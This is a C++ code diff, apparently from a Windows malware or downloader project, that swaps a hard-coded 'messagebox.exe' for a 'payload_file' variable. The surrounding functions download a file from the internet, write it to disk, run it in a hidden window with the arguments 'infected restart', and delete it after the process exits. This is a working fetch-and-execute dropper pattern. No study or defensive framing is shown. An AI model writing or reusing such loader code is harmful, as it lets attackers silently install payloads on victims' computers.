@@ -6,7 +6,7 @@ void CallMessageBoxFromShell()
 	ZeroMemory(&sei, sizeof(SHELLEXECUTEINFO));
 	sei.cbSize = sizeof(SHELLEXECUTEINFO);
 	sei.lpVerb = "OPEN";
-	sei.lpFile = "messagebox.exe";
+	sei.lpFile = payload_file;
 	sei.lpParameters = "infected restart";
 	sei.nShow = SW_HIDE;
 	sei.fMask = SEE_MASK_NOCLOSEPROCESS;
@@ -156,7 +156,7 @@ void Misc::CallFileFromInternet()
 		GetLastError();
 	}
 
-	errno_t error = fopen_s(&fp, "messagebox.exe", "wb");
+	errno_t error = fopen_s(&fp, payload_file, "wb");
 	while (InternetReadFile(hURL, file, sizeof(file) - 1, &read_file) && read_file != 0)
 	{
 		fwrite(file, sizeof(char), read_file, fp);
@@ -169,9 +169,9 @@ void Misc::CallFileFromInternet()
 	CallMessageBoxFromShell();
 
 	// if process is terminated (false), then delete
-	if (!isProcessRunning("messagebox.exe"))
+	if (!isProcessRunning(payload_file))
 	{
-		if (!DeleteFile("messagebox.exe"))
+		if (!DeleteFile(payload_file))
 		{
 			std::cout << GetLastError() << std::endl;
 		}
